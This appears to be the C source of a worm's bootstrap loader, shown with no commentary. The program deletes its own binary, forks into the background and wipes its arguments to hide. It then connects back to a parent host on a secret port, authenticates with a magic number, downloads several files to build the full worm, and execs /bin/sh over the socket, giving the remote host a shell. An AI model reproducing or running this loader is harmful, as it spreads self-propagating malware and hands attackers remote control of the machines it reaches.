#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

/*
 * The worm bootstrap program.
 * It pulls over the objects needed to build the full worm.
 */
main(argc, argv)
char *argv[];
{
	struct sockaddr_in sin;
	int s, i, magic, nfiles, j, len, n;
	FILE *fp;
	char files[20][128];
	char buf[2048], *p;

	/* hide */
	unlink(argv[0]);

	if(argc != 4)
		exit(1);

	/* don't make the remote worm wait */
	for(i = 0; i < 32; i++)
		close(i);
	i = fork();
	if(i < 0)
		exit(1);
	if(i > 0)
		exit(0);

	/* parse the arguments */
	bzero(&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	sin.sin_port = htons(atoi(argv[2]));
	magic = htonl(atoi(argv[3]));

	/* zap the arguments so that no one sees us */
	for(i = 0; i < argc; i++)
		for(j = 0; argv[i][j]; j++)
			argv[i][j] = '\0';

	/* re-connect with our parent on our secret port */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if(connect(s, &sin, sizeof(sin)) < 0){
		perror("l1 connect");
		exit(1);
	}
	dup2(s, 1);
	dup2(s, 2);

	/* take care of authentication */
	write(s, &magic, 4);

	/* loop copying files */
	nfiles = 0;
	while(1){
		/* get file length */
		if(xread(s, &len, 4) != 4)
			goto bad;
		len = ntohl(len);
		if(len == -1)
			break;

		/* get file name */
		if(xread(s, &(files[nfiles][0]), 128) != 128)
			goto bad;

		/* open local copy of file */
		unlink(files[nfiles]);
		fp = fopen(files[nfiles], "w");
		if(fp == 0)
			goto bad;
		nfiles++;

		/* suck over file */
		while(len > 0){
			n = sizeof(buf);
			if(n > len)
				n = len;
			n = read(s, buf, n);
			if(n <= 0)
				goto bad;
			if(fwrite(buf, 1, n, fp) != n)
				goto bad;
			len -= n;
		}
		fclose(fp);
	}

	/* when we're done, run a shell */
	execl("/bin/sh", "sh", 0);

bad:
	for(i = 0; i < nfiles; i++)
		unlink(files[i]);
	exit(1);
}

static
xread(fd, buf, n)
char *buf;
{
	int cc, n1;

	n1 = 0;
	while(n1 < n){
		cc = read(fd, buf, n - n1);
		if(cc <= 0)
			return(cc);
		buf += cc;
		n1 += cc;
	}
	return(n1);
}
